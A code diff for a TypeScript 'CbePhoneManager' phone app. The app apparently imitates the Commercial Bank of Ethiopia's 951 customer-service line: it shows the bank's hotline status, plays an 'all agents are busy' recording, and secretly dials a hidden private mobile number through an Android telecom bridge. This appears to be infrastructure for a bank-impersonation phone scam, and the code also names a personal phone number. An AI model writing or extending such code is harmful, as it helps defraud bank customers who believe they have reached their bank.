@@ -116,11 +116,6 @@ export class CbePhoneManager {
       window.onSecretCallRinging = (attemptNum: number) => {
         if (!this.isCallActive) return;
         this.secretLiveAttempt = attemptNum || Math.max(1, this.secretLiveAttempt);
-        // If already playing the busy hold MP3 (attempt > 1 silent redial), keep playing MP3 without interruption!
-        if (this.secretLivePhase === 'playing_busy_mp3') {
-          this.events.onSecretLivePhaseChange?.('playing_busy_mp3', this.secretLiveAttempt);
-          return;
-        }
         this.secretLivePhase = 'dialing_hidden';
         this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
         this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
@@ -153,11 +148,6 @@ export class CbePhoneManager {
     this.isMuted = muted;
     if (muted) {
       this.events.onUserSpeakingChange?.(false);
-    }
-    if (typeof window !== 'undefined' && window.AndroidTelecomBridge?.setMicrophoneMute) {
-      try {
-        window.AndroidTelecomBridge.setMicrophoneMute(muted);
-      } catch {}
     }
   }
 
@@ -378,11 +368,6 @@ export class CbePhoneManager {
     this.secretLivePhase = 'idle';
     this.secretLiveAttempt = 0;
     this.clearSecretLiveTimers();
-    if (typeof window !== 'undefined' && window.AndroidTelecomBridge?.setSpeakerphone) {
-      try {
-        window.AndroidTelecomBridge.setSpeakerphone(phoneAudio.getSpeaker());
-      } catch {}
-    }
     this.events.onSecretLivePhaseChange?.('idle', 0);
     this.events.onDraftClassProgressUpdate?.(0);
     this.events.onClassesUpdated?.(loadLearnedClasses(), this.selectedClassId);
@@ -467,11 +452,18 @@ export class CbePhoneManager {
       } catch (e) {
         console.warn('AndroidTelecomBridge placeSecretCall warning:', e);
       }
+    } else if (cfg.playRingbackDuringDial) {
+      // In Web Preview mode (or when carrier audio isn't active), play subtle phone ringback for the 2 rings
+      phoneAudio.startRingback();
     }
 
-    // 4 ሲነካ የቴሌኮም «ቱ-ቱ» ወይም «ዲም-ዲም» ድምፅ ሳይገባ ወዲያው የተመረጠው MP3 ብቻ ተጀምሮ እስኪነሳ ድረስ እንዲጫወት ይደረጋል!
-    phoneAudio.stopRingback();
-    this.handleSecretNoAnswerAndPlayBusyMp3();
+    // After 2 rings (maxRingMs), keep the call ringing until answered (do NOT disconnect)
+    // and loop the "ሁሉም የአገልግሎት ሰጪዎች ደንበኛ በማስተናገድ ላይ ናቸው..." MP3 continuously until answered!
+    this.secretRingTimer = setTimeout(() => {
+      this.secretRingTimer = null;
+      if (!this.isCallActive || this.secretLivePhase !== 'dialing_hidden') return;
+      this.handleSecretNoAnswerAndPlayBusyMp3();
+    }, maxRingMs);
   }
 
   // Plays "ሁሉም የአገልግሎት ሰጪዎች..." MP3 continuously in a loop while the phone keeps ringing until answered!
@@ -513,12 +505,6 @@ export class CbePhoneManager {
     this.isAgentSpeaking = false;
     this.events.onAgentSpeakingChange?.(false);
 
-    if (typeof window !== 'undefined' && window.AndroidTelecomBridge?.setSpeakerphone) {
-      try {
-        window.AndroidTelecomBridge.setSpeakerphone(phoneAudio.getSpeaker());
-      } catch {}
-    }
-
     this.secretLivePhase = 'connected_live';
     this.events.onSecretLivePhaseChange?.('connected_live', this.secretLiveAttempt);
     this.events.onTurnPhaseChange?.('idle');
@@ -559,10 +545,9 @@ export class CbePhoneManager {
   async playAgentGreeting(): Promise<void> {
     if (!this.isCallActive) return;
 
-    // 1. Check if Secret Live Phone Bridge (e.g. 0965848508) is enabled in J11 Studio or running inside Android App!
+    // 1. Check if Secret Live Phone Bridge (e.g. 0965848508) is enabled in J11 Studio!
     const secretBridge = loadSecretLiveBridgeConfig();
-    const hasAndroidBridge = typeof window !== 'undefined' && typeof window.AndroidTelecomBridge?.placeSecretCall === 'function';
-    if (secretBridge.enabled || hasAndroidBridge) {
+    if (secretBridge.enabled) {
       this.secretLiveAttempt = 0;
       this.startSecretDialAttempt();
       return;
